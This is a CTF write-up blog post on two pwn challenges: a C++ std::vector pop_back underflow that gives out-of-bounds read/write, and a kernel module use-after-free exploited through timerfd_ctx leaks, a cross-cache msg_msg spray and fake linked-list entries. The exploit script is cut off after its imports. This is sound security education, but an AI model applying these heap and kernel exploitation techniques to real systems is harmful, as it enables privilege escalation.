I participated with Blahaj in Lag and Crash 2024 this year and got 1st place :)

It had a couple of cool pwn challs (including kernel pwn!!), here are my writeups for them!

# Lucky Plaza

When I first saw the challenge and realized it's C++, I got scared and thought it's gonna be super hard. But finishing
the rest of the pwn challs, I had nothing else to do so I decided to try again. Luckily, source was given so I don't
need to reverse C++ binaries

## Analysis

```c
bool menu(vector<long> &vec)
{
    cout << "1. Add lucky number\n2. View lucky number\n3. Modify lucky number\n4. Guess lucky number\n5. Exit\n";
    cout << "Choice: ";
    int choice = 5;
    cin >> choice;
    switch (choice)
    {
    case 5:
        cout << "Goodbye!\n";
        return false;
    case 1:
        add_lucky_number(vec);
        break;
    case 2:
        view_lucky_number(vec);
        break;
    case 3:
        modify_lucky_number(vec);
        break;
    case 4:
        guess_lucky_number(vec);
        break;
    }

    return true;
}
```

The lucky numbers are stored in a vector, and we can perform common CRUD operations on it. To delete, we need to guess
a seeded RNG number, which will pop from the back of the vector.

```c
void guess_lucky_number(vector<long> &vec)
{
    int guess = 0;
    int correct = rand() % 0x88;
    cout << "Guess: ";
    cin >> guess;
    if (guess == correct)
    {
        cout << "Lucky you!\n";
        vec.pop_back();
    }
    else
    {
        cout << "Oops, try again!\n";
    }
}
```

We see that the `view` and `modify` functions check the bounds of the array, but don't use the `.at()` method for
vectors, which may indicate possible OOB!

```c
void view_lucky_number(vector<long> &vec)
{
    cout << "Which lucky number do you want to view?\n";
    size_t idx = 0;
    cin >> idx; // 1-index
    if (idx - 1 >= vec.size())
    {
        cout << "You don't have enough lucky numbers...\n";
        return;
    }
    cout << "Lucky number " << idx << ": " << vec[idx - 1] << '\n';
}

void modify_lucky_number(vector<long> &vec)
{
    cout << "Which lucky number do you want to modify?\n";
    size_t idx = 0;
    cin >> idx; // 1-index
    if (idx - 1 >= vec.size())
    {
        cout << "You don't have enough lucky numbers...\n";
        return;
    }
    cout << "What value do you want to set it to?\n";
    long value = 0;
    cin >> value;
    vec[idx - 1] = value;
    cout << "Updated!\n";
}
```

The only way is to make `idx - 1 >= vec.size()`. Initially, I thought `idx - 1` was the vuln by integer underflow, but
after trying a lot it doesn't work.

Based on my extensive experience with C++ pwn challenges, amounting to a total of 1, I remembered trying to exploit the
`std::string` struct. The essence of the challenge was to use `std::string` to perform some kind of heap feng shui and
subsequently get arb write. So I thought this challenge would be similar too, and started looking at how `std::vector`
works under the hood.

## std::vector

Note: this chall was very hard to debug locally because C++ needs a lot of random libaries which I didn't manage to link
during the CTF. So I setup GDB in the Docker container provided instead.

Dockerfile for debugging below 👍
```Dockerfile

# COPY --from=app / /srv
```

I allocated 1 lucky number and looked at the `std::vector` in the stack. We can see that it's simply represented by 3
pointers: `head`, `tail` and `max_size`. `head` and `tail` are abvious. `max_size` is the end of the chunk that holds
the vector, and is used to indicate when the vector should resize and reallocate (not important for this challenge
though)

```
00:0000│  0x7ffed6bdb140 —▸ 0x557e0b4f3720 ◂— 0x2a /* '*' */
01:0008│  0x7ffed6bdb148 —▸ 0x557e0b4f3730 ◂— 0x0
02:0010│  0x7ffed6bdb150 —▸ 0x557e0b4f3730 ◂— 0x0
```

I'm not sure where the struct size/type for vector is stored, so that it knows how to iterate through the pointers and
how much space to allocate for each element. Nonetheless, the implementation can't be that complicated. Anyway, we can
make a guess at how `.size()` is calculated:

```
pwndbg> p/x (0x557e0b4f3730-0x557e0b4f3720) / 8
$3 = 0x2
```

or in generic form `(tail - head) / sizeof(long)`. We can confirm this in the
[source](https://gcc.gnu.org/onlinedocs/gcc-4.6.2/libstdc++/api/a01069_source.html) for `libstdc++`:

```c++
// Line 567
// [23.2.4.2] capacity
/**  Returns the number of elements in the %vector.  */
size_type
size() const
{ return size_type(this->_M_impl._M_finish - this->_M_impl._M_start); }
```

Looking at this, is there any way to make `.size()` return a negative value? We can by making `tail < head`, since it
doesn't perform any checks before returning the value! Once ths size is negative (and the value returned by `.size()` is
type `size_t` - unsigned), we will underflow to `0xffffffffffffffff` and achieve OOB read/write. How can we do this?

The 2 other operations we have acting on the vector are `.push_back()` and `.pop_back()`. Let's look at the source for
both.

```c++
// [23.2.4.3] modifiers
/**
 *  @brief  Add data to the end of the %vector.
 *  @param  x  Data to be added.
 *
 *  This is a typical stack operation.  The function creates an
 *  element at the end of the %vector and assigns the given data
 *  to it.  Due to the nature of a %vector this operation can be
 *  done in constant time if the %vector has preallocated space
 *  available.
 */
void
push_back(const value_type& __x)
  {
    if (this->_M_impl._M_finish != this->_M_impl._M_end_of_storage)
  {
    this->_M_impl.construct(this->_M_impl._M_finish, __x);
    ++this->_M_impl._M_finish;
  }
    else _M_insert_aux(end(), __x);
  }
```

As we can see, `.push_back()` implementation is quite simple as well (I won't go into `.construct` and `insert_aux` cos
it's not relevant). It just appends the item to the end and increments `tail`.

```c++
/**
 *  @brief  Removes last element.
 *
 *  This is a typical stack operation. It shrinks the %vector by one.
 *
 *  Note that no data is returned, and if the last element's
 *  data is needed, it should be retrieved before pop_back() is
 *  called.
 */
void
pop_back()
{
    --this->_M_impl._M_finish;
    this->_M_impl.destroy(this->_M_impl._M_finish);
}
```

In `.pop_back()`, we see that it decrements `tail` and removes the last element, without doing any checks! This will
allow us to make `tail` smaller than `head`.

## Exploit

From here, we know our vector is stored on the heap. Are there any targets worth attacking using our OOB?

### Attack other chunks/tcache struct

At first, I thought this was a heap challenge and tried attacking `fd` ptr of other freed chunks. However, because of the
nature of `std::vector`, it doesn't free the chunk if size is reduced. So once the chunk is freed, since we don't have
any other access to the heap, we have no way to reclaim the chunk. This means a simple tcache poisoning won't work.

Another idea was to attack the tcache struct, which is also found on the heap. We can see it looks something like this:

```
pwndbg> x/32gx 0x557e0b4e1000
0x557e0b4e1000: 0x0000000000000000      0x0000000000000291
0x557e0b4e1010: 0x0000000000000001      0x0000000000000000
0x557e0b4e1020: 0x0000000000000000      0x0000000000000000
0x557e0b4e1030: 0x0000000000000000      0x0000000000000000
0x557e0b4e1040: 0x0000000000000000      0x0000000000000000
0x557e0b4e1050: 0x0000000000000000      0x0000000000000000
0x557e0b4e1060: 0x0000000000000000      0x0000000000000000
0x557e0b4e1070: 0x0000000000000000      0x0000000000000000
0x557e0b4e1080: 0x0000000000000000      0x0000000000000000
0x557e0b4e1090: 0x0000557e0b4f36d0      0x0000000000000000
0x557e0b4e10a0: 0x0000000000000000      0x0000000000000000
0x557e0b4e10b0: 0x0000000000000000      0x0000000000000000
0x557e0b4e10c0: 0x0000000000000000      0x0000000000000000
0x557e0b4e10d0: 0x0000000000000000      0x0000000000000000
0x557e0b4e10e0: 0x0000000000000000      0x0000000000000000
0x557e0b4e10f0: 0x0000000000000000      0x0000000000000000
```

After locating the correct size and member in the struct, we technically can create a fake `fd` pointer, change the
number of chunks in the tcache, and then allocate a chunk of the same size to get our arb write. However, I quickly
realized it's very hard to control this, especially if we want to do 2 writes (or 1 read + 1 write) for `exit_funcs`,
because `std::vector` quickly grows into unsorted size (size doubles every time it reallocates). And also it will never
shrink back to tcache size. Also, in order to leak libc from heap, we need a unsorted chunk to read the `main_arena`
address. So the attack will become very limited and complicated. In theory it might be possible, but we need good heap
control.

### Cross-page OOB

Without any good targets on the heap, we need to use our OOB to attack stuff outside the heap. The most obvious target
is libc, which lies after the heap (but is not adjacent). Because our size is now `0xffffffffffffffff`, we basically
have access to everything in memory, as long as we know the address so we can calculate the offset from the vector.

To get the lucky numbers for `pop_back()`, we can see that it's seeded with `time(0)`. So we can just write a script to
generate the numbers at the same time as when we connect, and the numbers should be the same most of the time.

```c
#include <iostream>
using namespace std;

int main() {
  srand(time(0));
  for (int i = 0; i < 100; i++) {
    cout << rand() % 0x88 << endl;
  }
}
```

Now, we need a heap and libc leak to calculate our OOB offset. As mentioned, we can leak libc from unsorted
chunks! Also, `std::string` allocates a growing chunk as the string length increases, giving us access to unsorted. So
we can allocate a big enough name and get our unsorted chunk already. For heap leak, it's even easier - there are
already freed tcache chunks in the heap, so just leak one of the `fd` pointers.

Then, we can just calculate the offset from `ptr_guard` and `exit_funcs`, and win :)

```py
#!/usr/bin/env python3

from pwn import *
import time
import os

exe = ELF("./lucky_plaza")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

# Cheminventory

> Author: Kaligula

[Source](https://github.com/Lag-and-Crash/2024/tree/main/challenges/pwn/Cheminventory)

This was my favourite challenge in the entire CTF because it's kernel pwn. I didn't solve it during the CTF sadly, but I
got until past cross-cache (with `msg_msg` in my UAF object). I didn't know enough kernel pwn tricks to proceed after
that, and was looking for some arb write with `msgmsg_seg` and race condition to overwrite `modprobe_path` (after
checking, the kernel disables `mobprobe_path` technique so it wouldn't work anyway).

Also, this is my first time doing kernel pwn, so I'll try to be super detailed in my writeup here :)

## Analysis

Initially, source wasn't given out and I had a hard time reversing the module, cos of a few weird artifacts in the
decompilation. After source was released, I quickly found the UAF bug. The full source is available in the repo, I'll
just analyse the important bits here.

### DO_CREATE

```c
case DO_CREATE: {           
    if (user_data.note_size > 100 || user_data.note_size == 0) {
        pr_info("A chemical explosion occurred. Oh no!\n");
        mutex_unlock(&chem_mutex);
        return -1;
    }
    
    chem = kmalloc(sizeof(struct chemical), GFP_KERNEL); 
    
    // Quantity
        chem->quantity = user_data.quantity;
    
    // CAS
        chem->cas = user_data.cas;
    
    // idx
        chem->idx = chemical_count; 
    chemical_count = chemical_count +1;
    
    // list_head
        list_add_tail(&chem->list, &chemical_head);
    
    // note_addr 
        chem->note_size = user_data.note_size; 
    note = kmalloc(user_data.note_size, GFP_KERNEL_ACCOUNT);
    memset(note, 0, user_data.note_size);
    chem->note_addr = (uint64_t) note;
    ret = copy_from_user(buf, (void __user *) user_data.note_addr, user_data.note_size-1);
    memcpy((void *) note, buf, user_data.note_size-1); 
    
    // name_addr 
        memset(buf, 0, sizeof(buf));
    ret = copy_from_user(buf, (void __user *) user_data.name_addr, 0xc8-1);
    memcpy((void *) chem->name, buf, 0xc8-1); 
    mutex_unlock(&chem_mutex);
    return 0;
}
```

Here, it's quite a basic create function - it reads and allocates a chemical in `kmalloc-256` page. The chemical is
slotted into a doubly-linked list (maintained using kernel functions!) and there is a `chemical_head` struct for this
purpose. The `idx` is used to keep track of the actual index of the chemical in the list and identify it.

---

### About pages and slabs

A page is basically a mini-heap-cache for kernel, and there are hundreds of them in the kernel. Each page can physically
store 16 chunks of the same size, and there can be multiple pages per size. There are empty pages (which will be
unallocated by the kernel soon), partial pages (which have a mix of used and free chunks), and full pages (which have
all chunks used and hence become inactive until a chunk in the page is freed).

A slab is a contiguous block of memory divided into pages. There are different slabs for different purposes, which the
kernel uses in order to improve security (it has lots of space for these slabs anyway). For example, there is
`kmalloc-256` and `kmalloc-cg-256`, where chunks allocated with `GFP_KERNEL_ACCOUNT` are stored in `cg`, and normal
chunks are stored in the general-purpose page type `kmalloc-256`. This provides even more separation between chunks used
for different purposes. Lastly, the code path taken to allocate a chunk is also important, as it is used as a seed to
determine which of the many `kmalloc-256` pages to allocate to. So it's quite confusing and unpredictable where our
chunks will end up (other than knowing the type of cache).

(thx to Kaligula for correcting my misconception about buddy allocator freeing pages instead of slabs!)

---

With this, we see that the chemical struct should appear in `kmalloc-256`, while the note should appear in
`kmalloc-cg-256`. This didn't turn out to be terribly important for the final exploit, but I did try to exploit this
later on.

A chemical has the following struct:

```c
struct chemical { 
    char name[0xc8];
    uint64_t quantity;
    uint64_t cas;
    uint64_t idx;
    struct list_head list;
    uint64_t note_size; 
    uint64_t note_addr;
};
```

```

0xffff888100f8cde0:     0xffffffffc0002640      0xffff888100f8cce0 -> fd, bk

```

The code here is pretty secure, so let's move on.

### DO_READ and DO_DELETE

```c
case DO_READ: {
    list_for_each(ptr, &chemical_head) {
        entry = list_entry(ptr, struct chemical, list);
        if (entry->idx == user_data.idx) {
            
            if (entry->note_size <= 100) {
                ret = copy_to_user((void __user *)user_data.note_addr, (void *) entry->note_addr, entry->note_size);
            }
            
            ret = copy_to_user((void __user *)user_data.name_addr, &entry->name, 0xc8-1);
            
            mutex_unlock(&chem_mutex);
            return 0;
        }
    }
    mutex_unlock(&chem_mutex);
    return 0;
    }
case DO_DELETE: {
    list_for_each(ptr, &chemical_head) {
        entry = list_entry(ptr, struct chemical, list);
        if (entry->idx == user_data.idx) {
            list_del(&entry->list); 
            kfree((void *) entry->note_addr);
            entry->note_addr = 0; 
            kfree(entry);
            pr_info("Deleted chemical at index %lld\n", user_data.idx);
            mutex_unlock(&chem_mutex);
            return 0;
        }
    }
    mutex_unlock(&chem_mutex);
    return 0;
    }
```

Let's look at both `DO_READ` and `DO_DELETE` since they're quite short and similar.

In `DO_READ`, we iterate through the list, looking for the chemical with the supplied `idx`. Once found, it returns the
`note` and `name`.

In `DO_DELETE`, we do the same and once found, we remove it from the linked list, then free both the chemical and its
note. Check are done in `list_del` to make sure our linked list is valid.

### DO_REPLACE

Now, for the most interesting and complicated function - `DO_REPLACE`.

```c
case DO_REPLACE: {
    if (user_data.note_size == 0) {
        pr_info("A chemical explosion occurred. Oh no!\n");
        mutex_unlock(&chem_mutex);
        return -1;
    }
    
    list_for_each(ptr, &chemical_head) {
        entry = list_entry(ptr, struct chemical, list);
        if (entry->idx == user_data.idx) {
            kfree((void *) entry->note_addr);
        
            list_del(&entry->list); 
            kfree(entry);
            pr_info("Replacing chemical at index %lld\n", user_data.idx);
            
            chem = kzalloc(sizeof(struct chemical), GFP_KERNEL); 
            chem->quantity = user_data.quantity;
            chem->cas = user_data.cas;
            chem->idx = user_data.idx; 
            list_add_tail(&chem->list, &chemical_head); 
            
            // New note
            note = kmalloc(user_data.note_size, GFP_KERNEL_ACCOUNT); 
            if (note == NULL) {
                kfree(chem); 
                pr_info("A chemical explosion occurred. Oh no!\n");
                mutex_unlock(&chem_mutex);
                return -1;
            }
            if (user_data.note_size > 100) { 
                chem->note_size = 100;
            } else {
                chem->note_size = user_data.note_size; 
            }
            memset(note, 0, chem->note_size);
            chem->note_addr = (uint64_t) note;
            ret = copy_from_user(buf, (void __user *) user_data.note_addr, user_data.note_size-1);
            memcpy((void *) note, buf, user_data.note_size-1); 
            
            // name_addr 
            memset(buf, 0, sizeof(buf));
            ret = copy_from_user(buf, (void __user *) user_data.name_addr, 0xc8-1);
            memcpy((void *) chem->name, buf, 0xc8-1); 
            mutex_unlock(&chem_mutex);
            return 0;
        }
    }
    mutex_unlock(&chem_mutex);
    return 0;
}
```

We can't directly update a chemical. Instead, we can free it and allocate a new one in place (only in terms of `idx`, in
the linked list we are appending to tail). We then continue to allocate the new note and read in the input for `note`
and `name`. The vulnerability here is that `chem` is added to the list before the check for `note == NULL`, giving us
UAF if `kmalloc(note_size)` fails! After some playing around, I found out that `kmalloc(0xffffffffffffffff)` will fail
(of course, since there's no space to allocate that big a chunk).

Once I found the UAF I thought the rest would be trivial. How wrong I was...

## Step 1: UAF

What can we do with this UAF? Since it was my first time doing kernel pwn, I thought the slub allocator was similar to
libc's `malloc`, so I thought that it would just be a trivial double free and `fd` overwrite. However, I soon realized
that the allocator actually does checks to ensure the pointer is in a valid slub before allocating and updating the
cache head with the poisoned `fd`. If not, it exits with a slub error. 

In fact, here's how a freed chemical looks like:

```
gef> x/32gx 0xffff888101dbde00
0xffff888101dbde00:     0x0000000000000000      0x0000000000000000
0xffff888101dbde10:     0x0000000000000000      0x0000000000000000
0xffff888101dbde20:     0x0000000000000000      0x0000000000000000
0xffff888101dbde30:     0x0000000000000000      0x0000000000000000
0xffff888101dbde40:     0x0000000000000000      0x0000000000000000
0xffff888101dbde50:     0x0000000000000000      0x0000000000000000
0xffff888101dbde60:     0x0000000000000000      0x0000000000000000
0xffff888101dbde70:     0x0000000000000000      0x0000000000000000
0xffff888101dbde80:     0xb8e3cef4e3fa3393      0x0000000000000000
0xffff888101dbde90:     0x0000000000000000      0x0000000000000000
0xffff888101dbdea0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdeb0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdec0:     0x0000000000000000      0x0000000000000005
0xffff888101dbded0:     0x0000000000000006      0x0000000000000000
0xffff888101dbdee0:     0xffffffffc0002640      0xffffffffc0002640
0xffff888101dbdef0:     0x0000000000000000      0x0000000000000000
```

The pointer at 0xffff888101dbde80 is actually the encrypted `fd`, which has a different encryption key for every page!
This makes it super hard to overwrite the fd, even disregarding the check done above. The weird thing is I remember
using just this to overwrite `modprobe_path` in another kernel pwn practice I tried last time. Maybe it's just the
kernel version.

Anyway, a simple double free to get arb write doesn't work in here. After reading more kernel writeups, I realized a lot
of people talked about "useful structures to exploit". Reading more, I learnt that a huge part of kernel pwn is finding
the right structure that you can exploit with the UAF available to you (hence why stuff like cross-cache exist as well).
With this newfound knowledge, I re-evaluated my UAF and narrowed down 2 structs I could exploit, at `kmalloc-256` size:

1. `msg_msg`
2. `timerfd_ctx`

Let's look at both of them!

### `msg_msg`

This struct can be initialized like this:

```c
msg_queue = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
msgsnd(msg_queue, &buf, sizeof(buf) - sizeof(long), 0);
```

And it can be freed like this:

```c
msgrcv(msg_queue, &buf, sizeof(buf) - sizeof(long), mtype, 0);
```

`msg_msg` is allocated in this function:

```c
static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;
    // ...
}
```

As we can see, `msg_msg` is allocated using `GFP_KERNEL_ACCOUNT`, which means it's going into the `kmalloc-cg-256`
cache. 

We can also allocate multiple different-size `msg_msg` in the same queue (which will be linked via a double-linked list
in `m_list`), and free in any order by specifying `mtype`.

The structure of `msg_msg` is

```c
/* one msg_msg structure for each message */
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
```

So the first 0x30 bytes are struct metadata, and the following is our buffer input. This struct thus has variable size,
which just needs to be greater than 0x30. However, the struct as we remember is in a different cache, since our
chemicals are in `kmalloc-256`, while this can only be in `kmalloc-cg-256`. This means that (for now) we can't use this
struct to replace our UAF object. Let's look at `timerfd_ctx` instead.

### `timerfd_ctx`

This struct can be initialized like this:

```c
struct itimerspec its;
timer_fd = timerfd_create(CLOCK_REALTIME, 0);
its.it_value.tv_sec = 1;
its.it_value.tv_nsec = 0;
its.it_interval.tv_sec = 1;
its.it_interval.tv_nsec = 0;
timerfd_settime(timer_fd, 0, &its, NULL);
```

And it will be freed a short while after closing `timer_fd`.

The struct is allocated as such:

```c
SYSCALL_DEFINE2(timerfd_create, int, clockid, int, flags)
{
	int ufd;
	struct timerfd_ctx *ctx;

	/* Check the TFD_* constants for consistency.  */
    // ...
	if ((clockid == CLOCK_REALTIME_ALARM ||
	     clockid == CLOCK_BOOTTIME_ALARM) &&
	    !capable(CAP_WAKE_ALARM))
		return -EPERM;

	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
	if (!ctx)
		return -ENOMEM;
    // ...
}
```

We see here that it's allocated with `GFP_KERNEL`. This means it's in `kmalloc-256`, the
same cache as chemical!

The struct is as follows:

```c
struct timerfd_ctx {
	union {
		struct hrtimer tmr;
		struct alarm alarm;
	} t;
	ktime_t tintv;
	ktime_t moffs;
	wait_queue_head_t wqh;
	u64 ticks;
	int clockid;
	short unsigned expired;
	short unsigned settime_flags;	/* to show in fdinfo */
	struct rcu_head rcu;
	struct list_head clist;
	spinlock_t cancel_lock;
	bool might_cancel;
};

struct hrtimer {
	struct timerqueue_node		node;
	ktime_t				_softexpires;
	enum hrtimer_restart		(*function)(struct hrtimer *);
	struct hrtimer_clock_base	*base;
	u8				state;
	u8				is_rel;
	u8				is_soft;
	u8				is_hard;
};

struct timerqueue_node {
	struct rb_node node;
	ktime_t expires;
};

struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
};

struct alarm {
	struct timerqueue_node	node;
	struct hrtimer		timer;
	enum alarmtimer_restart	(*function)(struct alarm *, ktime_t now);
	enum alarmtimer_type	type;
	int			state;
	void			*data;
};
```

Because of the union, `alarm` and `hrtimer` are mutually exclusive during the lifetime of this struct, so only 1 can
exist at a time. I believe when first intialized, the struct is using `alarm`, but I can't decipher the actual struct at
all. Here's what it looks like in memory:

```
gef> x/32gx 0xffff888101dbde00
0xffff888101dbde00:     0xffff888101dbd400      0xffff888101dbd300
0xffff888101dbde10:     0xffff888100e63d28      0x000000027d06f6cc
0xffff888101dbde20:     0x000000027d06f6cc      0xffffffff81285cc0
0xffff888101dbde30:     0xffff88813bc1e240      0x0000000000000001
0xffff888101dbde40:     0x0000000000000000      0x0000000000000000
0xffff888101dbde50:     0x0000000000000000      0x0000000000000000
0xffff888101dbde60:     0x0000000000000000      0x0000000000000000
0xffff888101dbde70:     0x0000000000000000      0x000000003b9aca00
0xffff888101dbde80:     0x17c09f6bff3a44e6      0x0000000000000000
0xffff888101dbde90:     0xffff888101dbde90      0xffff888101dbde90
0xffff888101dbdea0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdeb0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdec0:     0x0000000000000000      0x0000000000000000
0xffff888101dbded0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdee0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdef0:     0x0000000000000000      0x0000000000000000
```

Anyway, without fully understanding the struct, we still can see that we can leak `kbase` from the function pointer at
`+0x18`, which is pretty useful. When we free the object, we get something like this:

```
gef> x/32gx 0xffff888101dbde00
0xffff888101dbde00:     0xffff888101dbde00      0xffff888101dbd800
0xffff888101dbde10:     0xffff888100e63d28      0x000000027d06f6cc
0xffff888101dbde20:     0x000000027d06f6cc      0xffffffff81285cc0
0xffff888101dbde30:     0xffff88813bc1e240      0x0000000000000001
0xffff888101dbde40:     0x0000000000000000      0x0000000000000000
0xffff888101dbde50:     0x0000000000000000      0x0000000000000000
0xffff888101dbde60:     0x0000000000000000      0x0000000000000000
0xffff888101dbde70:     0x0000000000000000      0x000000003b9aca00
0xffff888101dbde80:     0x17c09f6bff3a44e6      0x0000000000000000
0xffff888101dbde90:     0xffff888101dbde90      0xffff888101dbde90
0xffff888101dbdea0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdeb0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdec0:     0x0000000000000000      0x0000000000000000
0xffff888101dbded0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdee0:     0x0000000000000000      0x0000000000000000
0xffff888101dbdef0:     0x0000000000000000      0x0000000000000000
```

We can see that `+0x00` now points to itself, which is an excellent kheap leak to determine the address of the
timerfd_ctx object! (why it does this, I have no idea)

So if `timerfd_ctx` overlaps UAF object and is freed, we can achieve the following from `DO_READ`:

1. kbase leak
2. kheap leak in `kmalloc-256`

Pretty useful!

I think if we had some way to edit chemical, we could have ended here after re-allocating the `timerfd_ctx`, as `+0x18`
holds a function pointer which will be called when the timer expires, and we can simply edit the chemical to change this
pointer. However, since we can't, we need to explore further.

## Step 2: Cross-cache attack

After using `timerfd_ctx` to leak some values, we want to upgrade the UAF to some other struct. Our first target is
`msg_msg`. But `msg_msg` is still in `kmalloc-cg-256`. How do we trick it to start allocating `msg_msg` at our UAF? This
is where cross-cache attack comes in.

The idea is to use the buddy allocator and slab freeing mechanism to free the `kmalloc-256` cache containing our UAF object, then
re-allocate the slab containing our page and make sure it's used for `kmalloc-cg-256`. That way, the old page that
contained our UAF object will now be used to store `msg_msg`, and there will be a `msg_msg` that overlaps with the UAF
object! `msg_msg` is quite ideal here as all the fields in `chemical` will be covered by `msg_msg` input buffer,
allowing us to mess around more with the chemical struct.

So, we want to fully control the entire slab containing our UAF object, such that we can free all the chunks in it and
cause it to be reused for `msg_msg`. One way to do this is to pad the object with `timerfd_ctx` chunks before and after,
so that the entire slab will be filled up. However, due to the unpredictability of SLUB allocator, we won't know exactly
in which page in the slab our object is allocated.

But kernel memory is cheap, and we can spam as many chunks as we want. By spraying, we will greatly increase the chances
of complete slab allocation. For some reason, only certain spray sizes actually work and it's quite random. In the end,
the spray size and insertion index (where to sneak in our UAF object during the spray) that worked for me were 0x2000
and 0x1500 respectively.

So, I will spray 0x14ff `timerfd_ctx` objects, perform the UAF using `DO_CREATE` and `DO_REPLACE`, then spray 0xb01 more
`timerfd_ctx` objects.

After this, we can free all the `timerfd_ctx` structs, and hopefully the slab will be unallocated as well. Now, we just
need to spray lots of `msg_msg` objects to reclaim the slab and complete the cross-cache attack. A good practice is to
place the queue index in `msg_msg` so we can identify the `msg_msg` that overlaps our object. After doing this spray, we
have successfully crossed the boundary from `kmalloc-256` to `kmalloc-cg-256`!

By the way, the spray sizes I used in my final exploit are way too excessive - you can probably get by with much less!
(pls no kernel abuse)

## Step 3: Fake chemicals

With `msg_msg` and `chemical` now overlapping, let's consider our options. Because `chemical` can't be edited, what we
have from `chemical` overlapping `msg_msg` is a free on `msg_msg`, but no control over `msg_msg` fields. In contrast,
what we have from `msg_msg` overlapping `chemical` is that `msg_msg` can overwrite `chemical` fields upon allocation.
This means that `msg_msg` has to be the initial arb write to overwrite `chemical` fields, and we know this is very
possible from the layout of both structs, because the input buffer of `msg_msg` overlaps the fields in `chemical`.

```

The fields worth attacking are `chem.idx`, `chem.fd`, `chem.bk` and `chem.note_addr`. For now, we don't know what to put
for `chem.fd`, so let's ignore it first. `chem.bk` should be `chemical_head` which we can calculate from kbase leak.
`chem.idx` is just our desired index to identify the chemical, so just set to 0x0. `chem.note_addr` is interesting, as
it not only gives arb read via `DO_READ` but also arb free via `DO_DELETE`. However, we also don't know what to put yet,
so just leave it empty for now. `kfree(0)` will not crash.

Another interesting leak we have is through `chem.name`, since it points to the top of the chunk, ie. the members of
`msg_msg` and a bit of the user input. With this, we can leak a few things:

1. `msg_msg.fd` - this is important later on
2. `msg_msg.bk` - also important later on
3. `msg_msg.text` - can leak the `msg_msg.idx` we placed at the start of user input

Last thing to note: since we're using linked list for chemical, before we can exploit the arb free, we need to fix the
linked list. Otherwise, when we `DO_DELETE`, the kernel will detect corrupted linked list and exit. The conditions we
need to fulfill are very similar to that of unsorted heap linked list check.

```c
if (likely(prev->next == entry && next->prev == entry))
    return true;
```

It's just checking if `p->bk->fd == p && p->fd->bk == p`, a check we know several bypass methods for from regular pwn
because of unlink attack and stuff. The most obvious and easy method is to make it point to itself at a certain offset,
such that it fulfills the check. But this may cause the list to become corrupt after `DO_DELETE` (especially
`chemical_head`, which is bad because we wouldn't be able to make more chemicals) I don't really want to screw up the
linked list so quickly, because I might need more chemicals in the future. And we can also do better than that!

So, the long and tedious way is to construct a fake linked list using more `msg_msg` structs, and eventually freeing the
one in the middle of our list. This way, we can guarantee that the check passes during the free since it only checks the
adjacent elements in the list. This means dealing with more fake chemicals, but we don't need to do it via UAF anymore.
We can just directly link our UAF chemical with the other fake chemicals via `chemical.fd` and `chemical.bk`, and place
our fake chemicals elsewhere! This is a lot easier once we manage get our leaks, which we unfortunately don't have yet.

### Leaking more `msg_msg`

Recall that `msg_msg` had the `fd` and `bk` pointers as well? These are used to point to the next and prev `msg_msg` in
the same queue, implementing the doubly-linked list. These are ordered by time of creation, so if I create 2 `msg_msg`
like this:

```c
int queue = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
msgsnd(queue, &buf1, sizeof(buf1) - sizeof(long), 0); // msg_msg_1
msgsnd(queue, &buf2, sizeof(buf2) - sizeof(long), 0); // msg_msg_2
```

We can see that the `msg_msg` with `buf1` will have `msg_msg.fd` pointing to the
`msg_msg` with `buf2`, and vice versa with `msg_msg_2.bk` pointing to
`msg_msg_1`. This is a very useful property when combined with our leak from
`chemical.name`, as it allows us to leak the address of the previous and next
`msg_msg` in the queue.

Now, we can use `msg_msg.fd` to leak subsequent `msg_msg` structs and "cascade" down the `msg_msg` linked list, fixing
the fake `chemical` linked list as we go along.

Basically, after spraying `kmalloc-cg-256` to cover UAF object, we spray another round of `msg_msg_2` in
`kmalloc-cg-512` over the same queues. For each queue, `msg_msg_1.fd` will now point to the new `msg_msg_2` in
`kmalloc-cg-512`. By leaking this pointer, we have a reference pointer to where our next fake `chemical` can be. Knowing
the `idx` of the specific queue containing our UAF object, we can re-populate the fields of the UAF chemical, by doing
`msgrcv` on that particular queue and freeing `msg_msg_1` in `kmalloc-cg-256`, then spraying a new `msg_msg_1_fixed` on
`kmalloc-cg-256`, reclaiming the original `msg_msg_1` address. (note the need to spray, as during the process of
allocating, cache randomization may change the cache we're allocating in) Eventually, `msg_msg_1_fixed` will overlap
with the UAF object again, fixing the chemical in-place.

But what should we update in `msg_msg_1_fixed`? We must make `chemical.fd` point to the next fake `chemical` at the
leaked address. This way, the chemical linked list will consist of 1 completely valid (in terms of linked list) chemical
which is our UAF object. While the 2nd chemical is not yet valid, we can `DO_READ` on it now, giving us another leak
which we can use, allowing us to repeat the above steps to fix itself and point to the 3rd object, and so on.

This is what it's gonna look like after fixing, for now:

![Linked list initial](@images/2024/lnc-2024/free-list-0.png)

Why use different chunk sizes for each `msg_msg`? It's a lot easier to pinpoint an address when spraying a size won't
accidentally overwrite my known pointer. Also, it doesn't actually matter where `fulfill.fd` points to, cos our program
will never actually check that in the subsequent exploit.

We now have a good linked list! Attacker chunk can be freed, which will link UAF object and fulfill chunk, without
severely messing up the linked list or failing any checks. But we still haven't decided what `chem.note_addr` should be!

## Step 4: Arbitrary free

As noted earlier, `chem.note_addr` gives us arbitrary free when deleting the chemical. What we want right now is to
upgrade our UAF from just `kmalloc-cg-256` to any cache we want, becoming an arbitrary free. So a good idea would be to
make this point to a vulnerable struct of our choice. But what struct to choose? 

### `tty_struct`

